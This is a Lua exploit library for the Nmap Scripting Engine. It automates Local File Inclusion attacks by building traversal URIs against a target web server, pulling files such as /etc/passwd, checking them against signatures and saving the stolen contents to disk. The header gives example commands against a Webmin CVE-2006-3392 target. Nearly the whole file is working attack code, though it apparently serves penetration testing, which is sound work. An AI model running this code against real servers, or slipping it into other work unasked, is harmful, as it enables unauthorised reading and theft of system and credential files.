---
-- An exploit library for nmap.
--
-- This module provides NSE scripts with an easy way to write exploits for
-- target services, covering what pwntools does for Python, but tailoring
-- the functionality towards what Nmap is typically used for
--
-- Exploiting Local File Inclusion
-- This library aims to assist in Local File Inclusion exploitation by
-- automatically enumerating through possible local file inclusion candidates
-- It serves to augment existing LFI scripts and future LFI scripts
--
-- If the option <code>exploit.load-all</code> is provided, the script tries to
-- download interesting files from the target to the directory provided. The
-- directory must be created first for this to work.
--
-- If the option <code>exploit.load-all-uri-only</code> is provided, it simply
-- loads the successful LFI'd uris to the file given in the option.
--
-- If the option <code>exploit.lfi-file-list</code> is provided, the script
-- will only load the list of files provided in the file specified by the option
--
-- If the option <code>exploit.lfi-os</code> is provided, the script will
-- attempt to only load files belonging to that OS (default: all)
-- (options are All, Auto, Linux, Windows, OSX)
--
-- Example usage:
-- <code>
-- To save successful uris to a list
-- nmap --script http-vuln-cve2006-3392 192.168.15.134 -p 10000 --script-args exploit.load-all-uri-only=evil_file
--
-- To load and save all successful lfi'd files using the default lists
-- nmap --script http-vuln-cve2006-3392 192.168.15.134 -p 10000 --script-args exploit.load-all=evil_dir
--
-- To load and save all successful lfi'd files using a user-defined list
-- nmap --script http-vuln-cve2006-3392 192.168.15.134 -p 10000 --script-args exploit.load-all=evil_dir,exploit.lfi-file-list=lfi.lst
--
-- To save successful uris only enumerating files belonging to a particular OS (in this case OSX)
-- nmap --script http-vuln-cve2006-3392 192.168.15.134 -p 10000 --script-args exploit.load-all-uri-only=evil_file,exploit.lfi-os=OSX
-- </code>
--
-- @copyright Same as Nmap--See https://nmap.org/book/man-legal.html

local stdnse = require "stdnse"
local http = require "http"
local string = require "string"
local table = require "table"
local io = require "io"
local os = require "os"

_ENV = stdnse.module("exploit", stdnse.seeall)

local FILE_SIGNATURES = {
  ['passwd'] = '(.*:.*:.*:.*:.*:.*:.*\n)',
}


-- source: https://github.com/lightos/Panoptic/blob/master/cases.xml
local LFI_FILES = {
  ["Linux"] = nmap.fetchfile("nselib/data/lfi-linux.lst"),
  ["Windows"] = nmap.fetchfile("nselib/data/lfi-windows.lst"),
  ["OSX"] = nmap.fetchfile("nselib/data/lfi-osx.lst"),
}

--  files to be enumerated
local FILES = {}

--- Writes string to file
--  Modified from: hostmap.nse
--  @param filename Filename to write
--  @param contents Content of file
--  @param original filename, if given
--  @param append   boolean signalling to append to a file rather than overwrite
--  @return true if file was written successfully, false otherwise
function write_file(filename, contents, original_file, append)
  local f, err
  if append then
    f, err = io.open(filename, "a")
  else
    f, err = io.open(filename, "w")
  end
  if not f then
    if original_file then
      stdnse.debug2("Error saving %s to %s: %s\n", original_file, filename, err)
    else
      stdnse.debug2("Error saving \"%s\" to %s: %s\n", contents, filename, err)
    end
    return f, err
  end
  f:write(contents)
  f:close()
  if original_file then
    stdnse.debug2("%s saved to %s\n", original_file, filename)
  else
    stdnse.debug2("\"%s\" saved to %s\n", contents, filename)
  end
  return true
end


--- loads a list to a table, ignoring commented lines denoted by '*'
--  @param  tbl       the table where the entries will be loaded
--  @param  file      the file where entries will be read
--  @return status    true if the file was successfully loaded, false otherwise
local function load_list_to_table(tbl, file, host)
  local status = false
  local file_h = io.open(file, "r")

  if not file then
    return false
  end

  for l in file_h:lines() do
    -- comments start with *, we remove all characters after the first *
    local p_line = string.gsub(l, "%*.*", "")

    -- we substitute {HOST} with the actual hostname, if we have
    if host.targetname then
      p_line = string.gsub(p_line, "{HOST}", host.targetname)
    elseif host.name ~= "" then
      p_line = string.gsub(p_line, "{HOST}", host.name)
    else
      p_line = string.gsub(p_line, "{HOST}", host.ip)
    end

    if p_line ~= "" then
      table.insert(tbl, p_line)
    end
  end
  status = true
  if status then
    stdnse.debug3("Successfully loaded %s", file)
  else
    stdnse.debug3("Failed to load %s", file)
  end
  return status
end

--- Loads table of files to be enumerated
--  @param oses       array of oses relevant to the lfi, default nil which loads all
--  @param file_list  filepath leading to the file_list to be loaded, default nil
local function load_file_list_lfi(oses, file_list, host)
  if #(stdnse.keys(FILES)) > 0 then
    FILES = {}
  end

  local oses_loaded
  local os_option = stdnse.get_script_args("exploit.lfi-os")
  if os_option == 'Auto' then
    -- rely on OS detection to figure out what files to load
    -- the user take a gamble with auto as it may come up with an OS with no matching signatures
    -- TODO improve this so that it can be the default behaviour
    oses_loaded = oses
    -- if no OS is detected and user did not provide a custom list, load all
    if (not oses_loaded or #oses_loaded == 0) and not file_list then
      oses_loaded = stdnse.keys(LFI_FILES)
    end
  elseif os_option == 'Windows' or os_option == 'Linux' or os_option == 'OSX' then
    oses_loaded = {}
    oses_loaded[#oses_loaded + 1] = os_option
  else
    -- default: load all
    -- encapsulates os_option = 'All' as well
    oses_loaded = stdnse.keys(LFI_FILES)
  end

  stdnse.debug3("OSes: %s, file_list: %s", oses, file_list)

  if file_list then
    load_list_to_table(FILES, file_list, host)
  else
    for _, os in pairs(oses_loaded) do
      load_list_to_table(FILES, LFI_FILES[os], host)
    end
  end
end

--- Gets the last portion of the filepath
--  e.g. /etc/passwd returns passwd
--  @param filepath       the filepath
--  @return A string containing the last portion from the filepath
function filepath_last_part(filepath)
  if string.match(filepath, '/') then
    return string.match(filepath, '.*/(.+)')
  else
    return filepath
  end
end

--- Gets the most specifc provided script-args
--  Chooses between the script args "exploit.cmd" and "SCRIPT_NAME.cmd"
--  @param   script_name   the caller script name
--  @return  a string with the most specific cmd to run
function get_shell_cmd(script_name)
  local cmd = stdnse.get_script_args(script_name .. '.cmd') or
    stdnse.get_script_args('exploit.cmd')
  return cmd
end

--- Processes the uri so it performs the lfi
--  @param  file           the file to include
--  @param  replace_slash  the character to replace slash with
--  @param  payload        the payload that triggers the lfi
--  @param  postfix        the character(s) to append at the back of the final uri
--  @return uri            the processed uri which triggers the lfi to get the local file
local function process_lfi_uri(file, replace_slash, payload, postfix)
  local r_file = file -- representation of file in uri
  if replace_slash then
    r_file = string.gsub(r_file, '/', replace_slash)
  end

  local uri = payload .. r_file
  if postfix then
    uri = uri .. postfix
  end
  return uri
end

--- processes the result of an lfi for saving
--  @param res                  the response from the server
--  @param host                 the host which we are running the attack against
--  @param port                 the port which hosts the services we are attacking
--  @param uri                  the uri queried for the lfi
--  @param file                 the original filename
--  @param successful_lfi_uris  table of successful lfi uris
--  @param directory            optional parameter to indicate whether to save to a directory
local function process_lfi_res(res, host, port, file, uri, successful_lfi_uris, directory)
  if res.status and res.status == 200 and res.body and res.body ~= "" then
    -- verify that the files are indeed correct before adding them
    local verifiable, verified = verify_file(file, res.body)
    if (verifiable and verified) or not verifiable then
      -- sets prefix to https if ssl is enabled, http otherwise
      local prefix = 'http' .. ((res.ssl and 's') or '') .. '://'
      local saved_uri = string.format('%s%s:%s%s\n', prefix, host.ip, port.number, uri)
      table.insert(successful_lfi_uris, saved_uri)

      if directory then
        -- saves only the last portion of the filepath to avoid issues with '/'
        local truncated_file = string.format("[%s]%s", host.ip, stdnse.filename_escape(file))
        local save_file = directory .. truncated_file
        write_file(save_file, res.body, file)
      end
    end
  end
end

--- Loads common files if the LFI was successful
--  @param host           the target host
--  @param port           the target port
--  @param payload        the payload that triggers the LFI
--  @param directory      the directory to save the accessed files to
--  @param replace_slash  the character to replace slash with
--  @param postfix        the character(s) to append to the end of the uri
--  @param load_uri_file  the file to save the uris that have been successfully lfi'd
--  @return A table containing strings of all successful LFIs that have been enumerated
local function load_all_lfi (host, port, payload, directory, replace_slash, postfix, load_uri_file)
  local successful_lfi_uris = {}
  -- ensures that directory is interpreted as a directory when writing
  if directory then
    directory = directory .. '/'

    -- ensures the directory is writable
    local status, err = write_file(directory .. 'test', 'abc')
    if err and string.match(err, 'No such file or directory') then
      stdnse.debug1('Error writing file, are you sure you have created the directory?')
      return nil
    end
    os.remove(directory .. 'test')
  end

  local lfi_file_list = stdnse.get_script_args('exploit.lfi-file-list')
  local oses = nil
  if host.os and host.os[1] then
    oses = {}
    stdnse.debug3("Potential OSes : %s", #host.os)
    for i, os in pairs(host.os) do
      oses[#oses+1] = host.os[i]['classes'][1]['osfamily']
    end
  end
  load_file_list_lfi(oses, lfi_file_list, host)


  -- parralelize with http.pipeline
  local all = nil
  local order_of_uri = {}

  for _, file in ipairs(FILES) do
    local uri = process_lfi_uri(file, replace_slash, payload, postfix)
    all = http.pipeline_add(uri, nil, all, "GET")
    order_of_uri[#order_of_uri+1] = {file, uri}
  end

  local results = http.pipeline_go(host, port, all)
  for i, result in pairs(results) do
    local l_file, l_uri = table.unpack(order_of_uri[i])
    process_lfi_res(result, host, port, l_file, l_uri, successful_lfi_uris, directory)
  end

  -- saves successful lfi-uris to a file if option is provided
  if load_uri_file then
    for _, lfi_url in ipairs(successful_lfi_uris) do
      write_file(load_uri_file, lfi_url, nil, true)
    end
  end

  return successful_lfi_uris
end

--- Verifies if a file is what it says it is
--  e.g. checks if /etc/passwd contains the expected syntax
--  @param filename       the name of the file to be checked against
--  @param file_contents  the contents of the file
--  @return verfiable     a boolean representing if the file has signatures
--  @return verified      a boolean representing if the file matches the signatures, if any
function verify_file(filename, file_contents)
  local verifiable, verified = false
  if filename and file_contents then
    local filename = filepath_last_part(filename)
    if FILE_SIGNATURES[filename] then
      verifiable = true
      if filename.match(file_contents, FILE_SIGNATURES[filename]) then
        verified = true
      end
    end
  end
  return verifiable, verified
end

--- Executes a LFI on the target URI
--  @param  host          the remote target ip to attack
--  @param  port          the port to run to attack against
--  @param  payload       the lfi payload
--  @param  filename      the local file name to include
--  @param  outfile       the output file to save to
--  @param  replace_slash character to replace slashes with
--  @param  postfix       postfix for the filepath
--  @return status        the status of the request
--  @return lfi_success   the status of the lfi attack
--  @return contents      the contents of the file
--  @return lfi_uris      the other uris that have been successfully loaded
function lfi_check(host, port, payload, filename, outfile, replace_slash, postfix)
  local l_filename = filename or stdnse.get_script_args("exploit.lfi_file") or "/etc/passwd"
  local outfile = outfile or stdnse.get_script_args("exploit.outfile")
  local load_all_dir = stdnse.get_script_args("exploit.load-all")
  local load_all_uri_only_file = stdnse.get_script_args("exploit.load-all-uri-only")
  if replace_slash then
    string.gsub(l_filename, '/', replace_slash)
  end
  local uri = payload .. l_filename

  if postfix then
    uri = uri .. postfix
  end

  stdnse.debug1("Getting %s", uri)
  local req = http.get(host, port, uri)
  stdnse.debug1("Status code " .. req.status)

  -- response came back
  if req.status and req.status == 200 then
    -- quit if body is empty, meaning file not included
    if string.len(req.body) <= 0 then
      stdnse.debug1("Response was empty using %s", uri)
      return req.status, false, req.body
    end

    -- if there are signatures try to verify them
    local verifiable, verified = verify_file(l_filename, req.body)

    if outfile then
      local status, err = write_file(outfile, req.body, stdnse.filename_escape(l_filename))
    end

    -- we deem it successful if
    -- there are known signatures and signatures check pass
    -- OR if there no known signatures and lfi passed
    local lfi_success = (verifiable and verified) or (not verifiable and req.status)

    local lfi_uris
    -- we only load more files if the lfi is successful
    if lfi_success and (load_all_dir or load_all_uri_only_file) then
      lfi_uris = load_all_lfi(host, port, payload, load_all_dir, replace_slash,
        postfix, load_all_uri_only_file)
    end

    return req.status, lfi_success, req.body, lfi_uris
  else
    return req.status, false, req.body
  end

end

return _ENV
